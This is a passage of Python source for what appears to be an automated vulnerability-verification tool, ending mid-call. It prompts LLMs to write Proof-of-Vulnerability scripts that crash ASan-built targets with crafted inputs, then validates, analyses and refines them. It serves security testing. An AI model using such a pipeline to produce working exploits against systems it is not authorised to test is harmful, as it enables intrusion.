        # ── Deterministic entrypoint override for CodeQL findings ─────────────
        # CodeQL findings always have a known enclosing function; we must never
        # accept 'unknown' or 'vulnerable_binary' from the LLM.  Extract the name
        # directly from the source file before any LLM normalisation runs.
        if source == 'codeql' and codebase_path and filepath and line_number:
            ext = Path(filepath or '').suffix.lower()
            if ext in {'.c', '.h', '.cc', '.cpp', '.cxx', '.hpp'}:
                static_ep = self._static_extract_enclosing_function(codebase_path, filepath, line_number)
                if static_ep and static_ep.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                    ec = dict(exploit_contract or {})
                    current_ep = str(ec.get('target_entrypoint') or '').strip()
                    if current_ep.lower() in {'', 'unknown', 'vulnerable_binary', 'none', 'n/a'} or not current_ep:
                        ec['target_entrypoint'] = static_ep
                        exploit_contract = ec
        # ─────────────────────────────────────────────────────────────────────
        
        audit = self.audit_handoff(exploit_contract or {}, cwe_type, explanation, vulnerable_code, filepath=filepath, runtime_feedback=runtime_feedback, phase='generation')
        normalized_contract = audit['normalized_contract']

        # ── Contract gate: hard stop if contract is unusable ─────────────────
        # Runs after audit_handoff so normalized_contract is available.
        # gate_family is derived from normalized_contract which has been through
        # audit_handoff normalisation (runtime_profile is the canonical field).
        gate_family = str(normalized_contract.get('runtime_profile') or '').lower()
        # Build preflight evidence from audit issues so _contract_gate can honour
        # stale/contradicted contract detection.  audit_handoff issues are
        # pre-generation — distinct from model-filled proof_plan.expected_oracle.
        audit_issues = list(audit.get('issues') or [])
        preflight_for_gate = {'issues': audit_issues} if audit_issues else None
        gate_blocking = self._contract_gate(normalized_contract, gate_family, preflight=preflight_for_gate)
        if gate_blocking:
            end_time = datetime.utcnow()
            return {
                'status': 'contract_gate_failed',
                'success': False,
                'pov_script': None,
                'suggestions': gate_blocking,
                'resolution_status': _resolution_status_from_gate(gate_blocking),
                'elapsed_s': (end_time - start_time).total_seconds(),
                'model_mode': 'offline' if self._is_offline_model_selected(model_name) else 'online',
            }
        # ─────────────────────────────────────────────────────────────────────

        # Determine PoV language based on exploit type and target runtime.
        # The universal selector picks the language that makes the exploit *actually trigger*
        # in the harness container rather than blindly matching the target language.
        contract_runtime = str((normalized_contract.get("runtime_profile") or target_language or "")).lower()
        pov_language = self._select_pov_language(
            contract_runtime=contract_runtime,
            cwe_type=cwe_type,
            exploit_contract=normalized_contract,
            explanation=explanation,
            vulnerable_code=vulnerable_code,
        )
        
        try:
            prompt_inputs = {
                'vulnerable_code': vulnerable_code,
                'explanation': explanation,
                'code_context': code_context,
            }
            is_offline = self._is_offline_model_selected(model_name)
            if is_offline:
                prompt_inputs = self._prepare_offline_pov_inputs(
                    model_name,
                    "pov",
                    vulnerable_code,
                    explanation,
                    code_context,
                )
            prompt_support = self._prepare_prompt_supporting_context(
                model_name,
                "pov",
                normalized_contract,
                runtime_feedback=runtime_feedback,
            )
            # For offline models use the scaffold prompt (JSON-first + tighter constraints).
            # Online models continue to use the standard structured prompt.
            if is_offline:
                surface_opts = None
                subcommands_for_prompt = None
                obs_surface_for_prompt = {}
                try:
                    rf = runtime_feedback or {}
                    obs = rf.get('observed_surface') or {}
                    surface_opts = obs.get('options') or None
                    subcommands_for_prompt = normalized_contract.get('known_subcommands') or None
                    obs_surface_for_prompt = obs
                except Exception:
                    surface_opts = None
                    subcommands_for_prompt = None
                prompt = format_pov_scaffold_prompt(
                    filepath=filepath,
                    line_number=line_number,
                    explanation=prompt_inputs["explanation"],
                    target_language=contract_runtime or target_language,
                    target_entrypoint=str(normalized_contract.get('target_entrypoint') or 'unknown'),
                    exploit_contract=prompt_support["exploit_contract"],
                    surface_options=surface_opts,
                    subcommands=subcommands_for_prompt,
                    offline=True,
                    observed_surface=obs_surface_for_prompt,
                )
            else:
                _obs_surface = dict((runtime_feedback or {}).get('observed_surface') or {})
                # Merge repo-level input hints into observed_surface so _build_binary_surface_block
                # can inject them into the prompt (repo-derived, not hardcoded).
                if repo_input_hints and (repo_input_hints.get('sample_files') or repo_input_hints.get('input_extensions')):
                    _obs_surface['repo_sample_files'] = repo_input_hints.get('sample_files', [])
                    _obs_surface['repo_input_extensions'] = repo_input_hints.get('input_extensions', [])
                prompt = format_pov_generation_prompt(
                    cwe_type=cwe_type,
                    filepath=filepath,
                    line_number=line_number,
                    vulnerable_code=prompt_inputs["vulnerable_code"],
                    explanation=prompt_inputs["explanation"],
                    code_context=prompt_inputs["code_context"],
                    target_language=pov_language,  # ← PoV language, not repo runtime
                    pov_language=pov_language,
                    exploit_contract=prompt_support["exploit_contract"],
                    runtime_feedback=prompt_support["runtime_feedback"],
                    subcommands=normalized_contract.get('known_subcommands') or None,
                    probe_context=probe_context or '',
                    observed_surface=_obs_surface,
                    joern_context=joern_context or '',
                )

            # If the contract was corrected to binary_cli (CLI binary confirmed), append
            # an explicit note so the model does NOT write an inline C harness.
            _plan_surface = str(
                (normalized_contract.get('proof_plan') or {}).get('execution_surface') or
                normalized_contract.get('execution_surface') or ''
            ).lower()
            if _plan_surface in ('binary_cli', 'cli'):
                prompt = prompt.rstrip() + (
                    "\n\nNOTE — CLI BINARY TARGET: A pre-built CLI binary exists at TARGET_BINARY. "
                    "Do NOT write an inline C harness or compile any code. "
                    "Invoke the binary via subprocess using os.environ['TARGET_BINARY'], "
                    "pass a real subcommand and crafted input, and let ASan/SIGSEGV detect the crash."
                )
            llm = self._get_llm(model_name, purpose="pov")
            
            # Universal system prompt — applies to ALL models (online and offline).
            # Do NOT add per-model branches here; any needed model quirks (e.g. /no_think)
            # are handled structurally in the scaffold and AST validator, not via prompt forks.
            _script_lang_label = {
                'javascript': 'JavaScript', 'node': 'JavaScript',
                'php': 'PHP', 'ruby': 'Ruby', 'go': 'Go',
            }.get(pov_language, 'Python')
            sys_msg = (
                "You are a security researcher writing a Proof-of-Vulnerability (PoV) script. "
                f"Output ONLY: (1) a ```json proof-plan block, then (2) a ```{pov_language} script block. "
                "Do NOT output a verdict, analysis, or investigation JSON. "
                "Do NOT output keys like 'verdict' or 'cwe_type'. "
                f"Write executable {_script_lang_label} code that triggers the vulnerability.\n\n"
                "CRITICAL RULES — apply regardless of model or target:\n"
                "1. Do NOT call the binary with --help, --version, or bare invocation with no input. "
                "   These never trigger a crash. Provide REAL INPUT DATA that exercises the vulnerable code path.\n"
                "2. Do NOT redeclare TARGET_BINARY, TARGET_BIN, or CODEBASE_PATH inside any function. "
                "   They are module-level variables set by the harness — use them directly.\n"
                "3. For file-parsing vulnerabilities: create a crafted malformed file and pass it as input.\n"
                "4. For buffer overflows: pass oversized or malformed string/binary arguments.\n"
                "5. For CLI tools: use a real subcommand with data that reaches the vulnerable function.\n"
                "6. The target binary is ALREADY BUILT with AddressSanitizer by the harness. "
                "   Do NOT use clang/gcc/cc to compile or link anything inside the PoV script. "
                "   Do NOT write compile_cmd, link_cmd, or any subprocess call to a compiler. "
                "   Simply invoke TARGET_BINARY with the correct subcommand and crafted input.\n"
                "/no_think"
            )
            messages = [
                SystemMessage(content=sys_msg),
                HumanMessage(content=prompt)
            ]
            
            response = llm.invoke(messages)
            # ── Strip <think> blocks before any parsing (qwen3 / reasoning models) ──
            raw_response = self._strip_think_blocks(response.content)
            # ── Detect investigation-format JSON misfire (offline models only) ──────
            # qwen3 and similar offline models sometimes output the investigation
            # verdict JSON (keys: verdict, cwe_type, explanation, ...) instead of the
            # PoV scaffold (keys: target_binary, argv, ...).  When detected, try to
            # extract any embedded code block, otherwise raise so the salvage pass fires.
            if is_offline:
                _raw_stripped = raw_response.strip()
                _json_start = _raw_stripped[:5] in ('{', '```j')
                if _json_start:
                    try:
                        _probe_json_src = _raw_stripped
                        if _probe_json_src.startswith('```'):
                            _probe_json_src = _probe_json_src.split('```json', 1)[-1].split('```', 1)[0].strip() if '```json' in _probe_json_src else _probe_json_src.split('```', 1)[1].split('```', 1)[0].strip()
                        _probe_parsed = json.loads(_probe_json_src)
                        _investigation_keys = {'verdict', 'cwe_type', 'confidence', 'llm_verdict'}
                        if isinstance(_probe_parsed, dict) and _investigation_keys & set(_probe_parsed.keys()):
                            # Model produced investigation JSON — treat as parse failure
                            # so the VerificationError triggers the salvage pass.
                            raise VerificationError(
                                f"Offline model produced investigation JSON instead of PoV scaffold "
                                f"(keys: {list(_probe_parsed.keys())[:6]}). "
                                f"Raw response stored in raw_response field."
                            )
                    except VerificationError:
                        raise
                    except Exception:
                        pass  # Not investigation JSON — continue normal parse path
            # ── Extract and validate the JSON proof plan (scaffold path) ───────────
            proof_plan_dict = None
            proof_plan_issues: List[str] = []
            plan_match = re.search(r'```json\s*(\{.*?\})\s*```', raw_response, re.DOTALL)
            if plan_match:
                try:
                    proof_plan_dict = json.loads(plan_match.group(1))
                    proof_plan_issues = self._validate_proof_plan(
                        proof_plan_dict,
                        exploit_contract=normalized_contract,
                    )
                except (json.JSONDecodeError, ValueError):
                    proof_plan_dict = None
            # ───────────────────────────────────────────────────────────
            parsed = self._parse_pov_payload(raw_response, cwe_type, explanation, vulnerable_code, filepath=filepath)
            pov_script = parsed["pov_script"]
            if not pov_script.strip():
                fallback = self._synthesize_native_library_fallback_pov(cwe_type, filepath, vulnerable_code, explanation, normalized_contract, runtime_feedback=runtime_feedback)
                if fallback:
                    return fallback
                raise VerificationError("Model did not return executable PoV code")
            exploit_contract = self._normalize_exploit_contract(parsed["exploit_contract"] or normalized_contract, cwe_type, explanation, vulnerable_code, filepath=filepath)
            # Attach proof plan and its validation issues to the contract for downstream use
            if proof_plan_dict:
                exploit_contract['proof_plan_json'] = proof_plan_dict
                # Thread expected_oracle from proof plan into contract success_indicators
                # so it is available to oracle evaluation as a supporting signal.
                ep_oracle = str(proof_plan_dict.get('expected_oracle') or '').strip()
                if ep_oracle and not exploit_contract.get('expected_outcome'):
                    exploit_contract['expected_outcome'] = ep_oracle
            if proof_plan_issues:
                exploit_contract['proof_plan_issues'] = proof_plan_issues
            exploit_contract['contract_audit'] = self.audit_handoff(exploit_contract, cwe_type, explanation, vulnerable_code, filepath=filepath, runtime_feedback=runtime_feedback, phase='generation')
            
            usage_details = extract_usage_details(response, agent_role="pov_generation")
            actual_cost = usage_details["cost_usd"]
            token_usage = usage_details["token_usage"]
            openrouter_usage = usage_details["openrouter_usage"]
            
            # Clean up markdown code blocks and bare language-tag prefix if present
            if "```python" in pov_script:
                pov_script = pov_script.split("```python")[1].split("```")[0].strip()
            elif "```javascript" in pov_script:
                pov_script = pov_script.split("```javascript")[1].split("```")[0].strip()
            elif "```" in pov_script:
                pov_script = pov_script.split("```")[1].split("```")[0].strip()
            pov_script = self._strip_language_prefix(pov_script)
            if not pov_script.strip():
                raise VerificationError("Model did not return executable PoV code")
            
            end_time = datetime.utcnow()
            generation_time = (end_time - start_time).total_seconds()
            
            return {
                "success": True,
                "pov_script": pov_script,
                "pov_language": pov_language,
                "target_language": target_language,
                "exploit_contract": exploit_contract,
                "generation_time_s": generation_time,
                "timestamp": end_time.isoformat(),
                "model_used": model_name or llm._autopov_model_name,
                "model_mode": "offline" if self._is_offline_model_selected(model_name) else "online",
                "cost_usd": actual_cost,
                "token_usage": token_usage,
                "openrouter_usage": openrouter_usage
            }
            
        except Exception as e:
            fallback = self._synthesize_native_library_fallback_pov(cwe_type, filepath, vulnerable_code, explanation, normalized_contract if 'normalized_contract' in locals() else exploit_contract, runtime_feedback=runtime_feedback)
            if fallback:
                return fallback
            end_time = datetime.utcnow()
            # Preserve the raw model response so the caller can attempt salvage
            # (e.g. extract a ```python block even when JSON parsing failed).
            _raw = locals().get('raw_response') or ''
            return {
                "success": False,
                "error": str(e),
                "pov_script": "",
                "raw_response": _raw,
                "pov_language": pov_language,
                "target_language": target_language,
                "generation_time_s": (end_time - start_time).total_seconds(),
                "timestamp": end_time.isoformat(),
                "model_mode": "offline" if self._is_offline_model_selected(model_name) else "online",
            }
    
    def validate_pov(
        self,
        pov_script: str,
        cwe_type: str,
        filepath: str,
        line_number: int,
        vulnerable_code: str = "",
        exploit_contract: Optional[Dict[str, Any]] = None,
        model_name: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Validate a PoV script using hybrid approach:
        1. Static analysis (fast)
        2. Unit test execution (if code available)
        3. LLM validation (fallback)
        
        Args:
            pov_script: Python script to validate
            cwe_type: CWE type
            filepath: File path
            line_number: Line number
            vulnerable_code: The vulnerable code snippet (optional)
        
        Returns:
            Validation result dictionary
        """
        result = {
            "is_valid": True,
            "issues": [],
            "suggestions": [],
            "will_trigger": "MAYBE",
            "validation_method": "unknown",
            "static_result": None,
            "unit_test_result": None
        }

        audit = self.audit_handoff(exploit_contract or {}, cwe_type, vulnerable_code or '', vulnerable_code or '', filepath=filepath, runtime_feedback=(exploit_contract or {}).get('runtime_feedback') or {}, phase='validation')
        exploit_contract = audit['normalized_contract']
        if not audit['is_ready']:
            result['is_valid'] = False
            result['issues'].extend(audit['issues'])
            result['suggestions'].extend(audit['warnings'])
            result['will_trigger'] = 'NO'
            result['validation_method'] = 'contract_gate'
            return result

        syntax_error = self._validate_pov_script_syntax(pov_script)
        if syntax_error:
            result["is_valid"] = False
            result["issues"].append(f"Syntax error: {syntax_error}")
            return result

        consistency_issues = self._contract_runtime_consistency_issues(pov_script, exploit_contract or {}, filepath, cwe_type, vulnerable_code=vulnerable_code)
        if consistency_issues:
            result["is_valid"] = False
            result["issues"].extend(consistency_issues)
            result["will_trigger"] = "NO"
            result["validation_method"] = "contract_consistency"
            return result
        
        # ===== STEP 1: Static Validation (Always run - fast) =====
        static_validator = get_static_validator()
        static_result = static_validator.validate(
            pov_script=pov_script,
            cwe_type=cwe_type,
            vulnerable_code=vulnerable_code,
            filepath=filepath,
            line_number=line_number,
            exploit_contract=exploit_contract or {}
        )
        
        result["static_result"] = {
            "is_valid": static_result.is_valid,
            "confidence": static_result.confidence,
            "matched_patterns": static_result.matched_patterns,
            "issues": static_result.issues
        }
        
        result["issues"].extend(static_result.issues)

        runtime_feedback = (exploit_contract or {}).get('runtime_feedback') or {}
        native_guardrail_issues = self._native_guardrail_issues(pov_script, exploit_contract, filepath)
        native_guardrail_issues.extend(self._proof_plan_binding_issues(exploit_contract, runtime_feedback))
        if native_guardrail_issues:
            result["issues"].extend(native_guardrail_issues)
            result["is_valid"] = False
            result["will_trigger"] = "NO"
            result["validation_method"] = "native_guardrails"
            return result
        
        # If static validation passes with high confidence, we're done
        if static_result.is_valid and static_result.confidence >= 0.8:
            result["is_valid"] = True
            result["will_trigger"] = "LIKELY"
            result["validation_method"] = "static_analysis"
            result["suggestions"].append(f"Static validation passed with {static_result.confidence:.0%} confidence")
            return result
        # ===== STEP 2: Unit Test Validation (If the snippet is executable in the unit harness) =====
        runtime_profile = self._infer_runtime_profile_from_filepath(filepath)
        proof_plan = (exploit_contract or {}).get("proof_plan") or {}
        browser_dom_plan = str(proof_plan.get("execution_surface") or "").lower() == "browser_dom" or str((exploit_contract or {}).get("runtime_profile") or "").lower() == "browser"
        unit_test_supported = not browser_dom_plan and (
            runtime_profile in {"python", "javascript", "node"} or bool(re.search(r"(^|\n)\s*(def\s+|function\s+|async\s+function\s+)", vulnerable_code or ""))
        )
        if vulnerable_code and len(vulnerable_code) > 10 and unit_test_supported:
            unit_runner = get_unit_test_runner()
            normalized_runtime = "javascript" if runtime_profile in {"javascript", "node"} else "python"
            
            # First check syntax
            syntax_check = unit_runner.validate_syntax(pov_script, runtime_profile=normalized_runtime)
            if not syntax_check["valid"]:
                result["is_valid"] = False
                result["issues"].append(f"Syntax error: {syntax_check['error']}")
                return result
            
            # Run unit test
            unit_result = unit_runner.test_vulnerable_function(
                pov_script=pov_script,
                vulnerable_code=vulnerable_code,
                cwe_type=cwe_type,
                scan_id=f"validate_{cwe_type}_{line_number}",
                exploit_contract=exploit_contract or {},
                runtime_profile=normalized_runtime,
                filepath=filepath,
            )
            
            # Extract oracle evidence from unit test details
            oracle_result = unit_result.details.get("oracle", {})
            
            result["unit_test_result"] = {
                "success": unit_result.success,
                "vulnerability_triggered": unit_result.vulnerability_triggered,
                "execution_time_s": unit_result.execution_time_s,
                "exit_code": unit_result.exit_code,
                "stdout": unit_result.stdout[:500] if unit_result.stdout else "",  # Truncate
                "stderr": unit_result.stderr[:500] if unit_result.stderr else "",  # Truncate
                "oracle": oracle_result  # Include detailed oracle evidence
            }
            
            if unit_result.vulnerability_triggered:
                result["is_valid"] = True
                result["will_trigger"] = "YES"
                result["validation_method"] = "unit_test_execution"
                
                # Add detailed evidence to suggestions
                evidence = oracle_result.get("evidence", [])
                confidence = oracle_result.get("confidence", "low")
                method = oracle_result.get("method", "unknown")
                
                if evidence:
                    result["suggestions"].append(f"Vulnerability confirmed with {confidence} confidence ({method}):")
                    for item in evidence[:3]:  # Show top 3 evidence items
                        result["suggestions"].append(f"  - {item}")
                else:
                    result["suggestions"].append("Unit test execution confirmed vulnerability trigger")
                
                return result
            elif unit_result.success:
                result["will_trigger"] = "MAYBE"
                result["validation_method"] = "unit_test_execution"
                result["suggestions"].append("Unit test ran but did not trigger vulnerability")
            else:
                result["issues"].append(f"Unit test failed: {unit_result.stderr[:200]}")
        elif vulnerable_code and len(vulnerable_code) > 10:
            result["suggestions"].append("Skipped unit-test harness for non-Python/non-JavaScript target code")
        
        # ===== STEP 3: Traditional Validation (Fallback) =====
        runtime = self._infer_pov_script_runtime(pov_script)

        # Check 1: Language-aware syntax validation
        if runtime == "python":
            try:
                ast.parse(pov_script)
            except SyntaxError as e:
                result["is_valid"] = False
                result["issues"].append(f"Syntax error: {str(e)}")
                return result
        elif runtime == "javascript":
            syntax_check = get_unit_test_runner().validate_syntax(pov_script, runtime_profile="javascript")
            if not syntax_check.get("valid"):
                result["is_valid"] = False
                result["issues"].append(f"Syntax error: {syntax_check.get('error') or 'JavaScript syntax error'}")
                return result

        # Check 2: Must contain an observable proof marker
        if "VULNERABILITY TRIGGERED" not in pov_script and "alert(" not in pov_script:
            result["is_valid"] = False
            result["issues"].append("Missing required observable proof marker")

        # Check 3: Only standard library imports for Python PoVs
        disallowed_imports = []
        if runtime == "python":
            stdlib_modules = self._get_stdlib_modules()
            try:
                tree = ast.parse(pov_script)
                for node in ast.walk(tree):
                    if isinstance(node, ast.Import):
                        for alias in node.names:
                            top_module = alias.name.split('.')[0]
                            if top_module not in stdlib_modules:
                                disallowed_imports.append(alias.name)
                    elif isinstance(node, ast.ImportFrom):
                        if node.module:
                            top_module = node.module.split('.')[0]
                            if top_module not in stdlib_modules:
                                disallowed_imports.append(node.module)
            except Exception:
                pass

        if disallowed_imports:
            result["issues"].append(f"Non-stdlib imports detected: {', '.join(disallowed_imports)}")
        
        # Check 4: CWE-specific validation
        if cwe_type and cwe_type != "UNCLASSIFIED":
            cwe_issues = self._validate_cwe_specific(pov_script, cwe_type)
            result["issues"].extend(cwe_issues)
        
        # Check 5: Use LLM for advanced validation (only if other methods inconclusive)
        if result["validation_method"] == "unknown":
            try:
                llm_result = self._llm_validate_pov(
                    pov_script, cwe_type, filepath, line_number, exploit_contract or {}, model_name
                )
                result["will_trigger"] = llm_result.get("will_trigger", "MAYBE")
                result["suggestions"].extend(llm_result.get("suggestions", []))
                result["issues"].extend(llm_result.get("issues", []))
                result["validation_method"] = "llm_analysis"
                result["token_usage"] = llm_result.get("token_usage", {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0})
                result["cost_usd"] = llm_result.get("cost_usd", 0.0)
                result["openrouter_usage"] = llm_result.get("openrouter_usage", {})
            except Exception as e:
                result["suggestions"].append(f"LLM validation skipped: {str(e)}")
        
        # Final validity check
        unit_test_result = result.get("unit_test_result") or {}
        if result["issues"] and not unit_test_result.get("vulnerability_triggered"):
            # If unit test didn't trigger but also didn't fail completely, still might be valid
            critical_issues = [i for i in result["issues"] if "Syntax" in i or "Missing required" in i]
            if critical_issues:
                result["is_valid"] = False
        
        return result
    
    def _get_stdlib_modules(self) -> set:
        """Get Python standard library module names"""
        return {
            'abc', 'argparse', 'array', 'ast', 'asyncio', 'base64', 'binascii',
            'binhex', 'bisect', 'builtins', 'bz2', 'calendar', 'cgi', 'cgitb',
            'chunk', 'cmath', 'cmd', 'code', 'codecs', 'codeop', 'collections',
            'colorsys', 'compileall', 'concurrent', 'configparser', 'contextlib',
            'contextvars', 'copy', 'copyreg', 'cProfile', 'crypt', 'csv', 'ctypes',
            'curses', 'dataclasses', 'datetime', 'dbm', 'decimal', 'difflib',
            'dis', 'distutils', 'doctest', 'email', 'encodings', 'enum', 'errno',
            'faulthandler', 'fcntl', 'filecmp', 'fileinput', 'fnmatch', 'fractions',
            'ftplib', 'functools', 'gc', 'getopt', 'getpass', 'gettext', 'glob',
            'graphlib', 'grp', 'gzip', 'hashlib', 'heapq', 'hmac', 'html', 'http',
            'idlelib', 'imaplib', 'imghdr', 'imp', 'importlib', 'inspect', 'io',
            'ipaddress', 'itertools', 'json', 'keyword', 'lib2to3', 'linecache',
            'locale', 'logging', 'lzma', 'mailbox', 'mailcap', 'marshal', 'math',
            'mimetypes', 'mmap', 'modulefinder', 'multiprocessing', 'netrc',
            'nis', 'nntplib', 'numbers', 'operator', 'optparse', 'os', 'ossaudiodev',
            'pathlib', 'pdb', 'pickle', 'pickletools', 'pipes', 'pkgutil', 'platform',
            'plistlib', 'poplib', 'posix', 'posixpath', 'pprint', 'profile',
            'pstats', 'pty', 'pwd', 'py_compile', 'pyclbr', 'pydoc', 'queue',
            'quopri', 'random', 're', 'readline', 'reprlib', 'resource', 'rlcompleter',
            'runpy', 'sched', 'secrets', 'select', 'selectors', 'shelve', 'shlex',
            'shutil', 'signal', 'site', 'smtpd', 'smtplib', 'sndhdr', 'socket',
            'socketserver', 'spwd', 'sqlite3', 'ssl', 'stat', 'statistics',
            'string', 'stringprep', 'struct', 'subprocess', 'sunau', 'symtable',
            'sys', 'sysconfig', 'syslog', 'tabnanny', 'tarfile', 'telnetlib',
            'tempfile', 'termios', 'test', 'textwrap', 'threading', 'time',
            'timeit', 'tkinter', 'token', 'tokenize', 'trace', 'traceback',
            'tracemalloc', 'tty', 'turtle', 'turtledemo', 'types', 'typing',
            'unicodedata', 'unittest', 'urllib', 'uu', 'uuid', 'venv', 'warnings',
            'wave', 'weakref', 'webbrowser', 'winreg', 'winsound', 'wsgiref',
            'xdrlib', 'xml', 'xmlrpc', 'zipapp', 'zipfile', 'zipimport', 'zlib',
            '_thread', '__future__'
        }
    
    def _validate_cwe_specific(self, pov_script: str, cwe_type: str) -> list:
        """Light advisory checks based on known vulnerability class patterns.
        
        These are purely advisory (warnings) and must never unconditionally block a PoV.
        The system is CWE-agnostic: UNCLASSIFIED findings skip this entirely,
        and known-CWE findings only get soft hints, not hard blocks.
        """
        issues = []
        if not cwe_type or cwe_type in ("UNCLASSIFIED", "UNKNOWN"):
            return issues

        lower = pov_script.lower()

        if cwe_type == "CWE-89":  # SQL Injection — only warn if no SQL payload at all
            sql_keywords = ['select', 'insert', 'update', 'delete', 'drop', 'union', "'", '"']
            if not any(kw in lower for kw in sql_keywords):
                issues.append("Advisory: SQL injection PoV may benefit from a SQL payload (SELECT/UNION/etc.)")

        # CWE-119, CWE-416, CWE-190 — removed hard checks; exploit contract + runtime oracle
        # are the authoritative proof signal, not keyword presence.

        return issues
    
    def _llm_validate_pov(
        self,
        pov_script: str,
        cwe_type: str,
        filepath: str,
        line_number: int,
        exploit_contract: Optional[Dict[str, Any]] = None,
        model_name: Optional[str] = None
    ) -> Dict[str, Any]:
        """Use LLM to validate PoV script"""
        prompt_script = pov_script
        prompt_contract = exploit_contract or {}
        if self._is_offline_model_selected(model_name):
            prompt_script = self._compact_text(
                pov_script,
                settings.get_offline_pov_budget(model_name=model_name, purpose="validation")["max_failed_pov_chars"],
            )
            prompt_contract = self._compact_offline_contract(exploit_contract or {}, model_name, "validation")
        prompt = format_pov_validation_prompt(
            pov_script=prompt_script,
            cwe_type=cwe_type,
            filepath=filepath,
            line_number=line_number,
            exploit_contract=prompt_contract
        )
        llm = self._get_llm(model_name, purpose="validation")
        messages = [
            SystemMessage(content="You are validating security test scripts."),
            HumanMessage(content=prompt)
        ]
        
        response = llm.invoke(messages)
        usage_details = extract_usage_details(response, agent_role="llm_validation")
        
        try:
            json_text = response.content
            if "```json" in json_text:
                json_text = json_text.split("```json")[1].split("```")[0]
            elif "```" in json_text:
                json_text = json_text.split("```")[1].split("```")[0]
            
            parsed = json.loads(json_text.strip())
            parsed["token_usage"] = usage_details["token_usage"]
            parsed["cost_usd"] = usage_details["cost_usd"]
            parsed["openrouter_usage"] = usage_details["openrouter_usage"]
            return parsed
        except json.JSONDecodeError:
            return {
                "is_valid": True,
                "issues": [],
                "suggestions": [],
                "will_trigger": "MAYBE",
                "token_usage": usage_details["token_usage"],
                "cost_usd": usage_details["cost_usd"],
                "openrouter_usage": usage_details["openrouter_usage"]
            }
    
    def analyze_failure(
        self,
        cwe_type: str,
        filepath: str,
        line_number: int,
        explanation: str,
        failed_pov: str,
        execution_output: str,
        attempt_number: int,
        max_retries: int,
        model_name: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Analyze why a PoV failed and suggest improvements
        
        Args:
            cwe_type: CWE type
            filepath: File path
            line_number: Line number
            explanation: Vulnerability explanation
            failed_pov: The failed PoV script
            execution_output: Output from execution
            attempt_number: Current attempt number
            max_retries: Maximum retries allowed
        
        Returns:
            Analysis result with suggestions
        """
        prompt_explanation = explanation
        prompt_failed_pov = failed_pov
        prompt_execution_output = execution_output
        if self._is_offline_model_selected(model_name):
            budget = settings.get_offline_pov_budget(model_name=model_name, purpose="retry")
            prompt_explanation = self._compact_text(explanation, budget["max_explanation_chars"])
            prompt_failed_pov = self._compact_text(failed_pov, budget["max_failed_pov_chars"])
            prompt_execution_output = self._compact_text(execution_output, budget["max_context_chars"])
        prompt = format_retry_analysis_prompt(
            cwe_type=cwe_type,
            filepath=filepath,
            line_number=line_number,
            explanation=prompt_explanation,
            failed_pov=prompt_failed_pov,
            execution_output=prompt_execution_output,
            attempt_number=attempt_number,
            max_retries=max_retries
        )
        llm = self._get_llm(model_name, purpose="retry")
        messages = [
            SystemMessage(content="You are analyzing failed security tests."),
            HumanMessage(content=prompt)
        ]
        
        response = llm.invoke(messages)
        
        try:
            json_text = response.content
            if "```json" in json_text:
                json_text = json_text.split("```json")[1].split("```")[0]
            elif "```" in json_text:
                json_text = json_text.split("```")[1].split("```")[0]
            
            return json.loads(json_text.strip())
        except json.JSONDecodeError:
            return {
                "failure_reason": "Could not parse analysis",
                "suggested_changes": "Review execution output manually",
                "different_approach": attempt_number >= max_retries
            }
    
    def refine_pov(
        self,
        cwe_type: str,
        filepath: str,
        line_number: int,
        vulnerable_code: str,
        explanation: str,
        code_context: str,
        failed_pov: str,
        validation_errors: List[str],
        attempt_number: int,
        target_language: str = "python",
        model_name: Optional[str] = None,
        exploit_contract: Optional[Dict[str, Any]] = None,
        runtime_feedback: Optional[Dict[str, Any]] = None,
        probe_context: str = '',
    ) -> Dict[str, Any]:
        """
        Refine a failed PoV script based on validation errors
        
        Args:
            cwe_type: CWE type
            filepath: File path
            line_number: Line number
            vulnerable_code: The vulnerable code snippet
            explanation: Vulnerability explanation
            code_context: Surrounding code context
            failed_pov: The failed PoV script
            validation_errors: List of validation error messages
            attempt_number: Current retry attempt number
            target_language: Language of the target codebase
            model_name: Optional model name to use
            probe_context: Pre-formatted probe context string from ProbeResult
        
        Returns:
            Dictionary with refined PoV script and metadata
        """
        start_time = datetime.utcnow()
        # Merge passed-in runtime_feedback into the contract's existing feedback
        # so known_subcommands / observed_surface reach _normalize_exploit_contract.
        effective_runtime_feedback = dict(runtime_feedback or {})
        if not effective_runtime_feedback:
            effective_runtime_feedback = (exploit_contract or {}).get('runtime_feedback') or {}
        
        try:
            audit = self.audit_handoff(exploit_contract or {}, cwe_type, explanation, vulnerable_code, filepath=filepath, runtime_feedback=effective_runtime_feedback, phase='refinement')
            normalized_contract = audit['normalized_contract']
            validation_errors = list(validation_errors or []) + [msg for msg in audit.get('issues', []) if msg not in (validation_errors or [])]
            prompt_inputs = {
                'vulnerable_code': vulnerable_code,
                'explanation': explanation,
                'code_context': code_context,
                'failed_pov': failed_pov,
                'validation_errors': validation_errors,
            }
            if self._is_offline_model_selected(model_name):
                prompt_inputs = self._prepare_offline_pov_inputs(
                    model_name,
                    "refinement",
                    vulnerable_code,
                    explanation,
                    code_context,
                    failed_pov=failed_pov,
                    validation_errors=validation_errors,
                )
            prompt_support = self._prepare_prompt_supporting_context(
                model_name,
                "refinement",
                normalized_contract,
                validation_errors=validation_errors,
                runtime_feedback=effective_runtime_feedback,
            )
            # Determine PoV language for refinement FIRST — must be known before building
            # the prompt payload so `target_language` in the payload matches the system message.
            _refine_runtime = str((normalized_contract.get("runtime_profile") or target_language or "")).lower()
            _refine_pov_lang = self._select_pov_language(
                contract_runtime=_refine_runtime,
                cwe_type=cwe_type,
                exploit_contract=normalized_contract,
                explanation=explanation,
                vulnerable_code=vulnerable_code,
            )
            _refine_lang_label = {
                'javascript': 'JavaScript', 'node': 'JavaScript',
                'php': 'PHP', 'ruby': 'Ruby', 'go': 'Go',
            }.get(_refine_pov_lang, 'Python')

            # Always use the full refinement prompt regardless of attempt number.
            # The constrained format (attempt >= 2) was stripping explanation and code
            # context, leaving the model with only 1090 tokens and no vulnerability
            # background — causing identical repeated outputs. The full prompt gives the
            # model everything it needs to course-correct on hard targets.
            # IMPORTANT: pass _refine_pov_lang as target_language so the payload JSON
            # instructs the model to write in the correct language, not the repo language.
            prompt = format_pov_refinement_prompt(
                cwe_type=cwe_type,
                filepath=filepath,
                line_number=line_number,
                vulnerable_code=prompt_inputs["vulnerable_code"],
                explanation=prompt_inputs["explanation"],
                code_context=prompt_inputs["code_context"],
                failed_pov=prompt_inputs["failed_pov"],
